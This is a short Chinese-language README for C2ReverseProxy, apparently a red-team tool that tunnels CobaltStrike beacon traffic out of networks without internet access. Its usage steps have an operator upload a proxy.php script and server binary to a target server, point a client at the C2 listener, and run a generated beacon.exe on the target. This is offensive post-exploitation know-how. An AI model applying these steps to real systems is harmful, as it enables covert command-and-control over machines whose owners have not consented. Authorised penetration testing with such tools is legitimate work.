# C2ReverseProxy

ReverseProxy C2 - 在不出网的情况下使cs上线

# Description

在渗透过程中遇到不出网的环境时，可使用该工具建立反向代理通道，使CobaltStrike生成的beacon可以回弹到CobaltStrike服务器。

# 免责声明
该工具仅用于安全自查检测

由于传播、利用此工具所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。

本人拥有对此工具的修改和解释权。未经网络安全部门及相关部门允许，不得善自使用本工具进行任何攻击活动，不得以任何方式将其用于商业目的。

# Install

```
git clone https://github.com/Daybr4ak/DReverseProxy.git
```

# Usage

```markdown
该文件分为3个部分：
1、C2script  
2、C2ReverseClint
3、C2ReverseServer

使用步骤：
1、将C2script目录下的对应文件，如proxy.php 以及C2ReverseServer上传到目标服务器。
2、使用C2ReverseServer建立监听端口：
./C2ReverseServer  (默认为64535)
3、修改C2script目录下对应文件的PORT，与C2ReverseServer监听的端口一致。
4、本地或C2服务器上运行C2ReverseClint工具
./C2ReverseClint -t C2IP:C2ListenerPort -u http://example.com/proxy.php (传送到目标服务器上的proxy.php路径)
5、使用CobaltStrike建立本地Listener(127.0.0.1 64535)端口与C2ReverseServer建立的端口对应
6、使用建立的Listner生成可执行文件beacon.exe传至目标服务器运行
7、可以看到CobaltStrike上线。
```
# Bug

一个server端口只支持一个cs上线



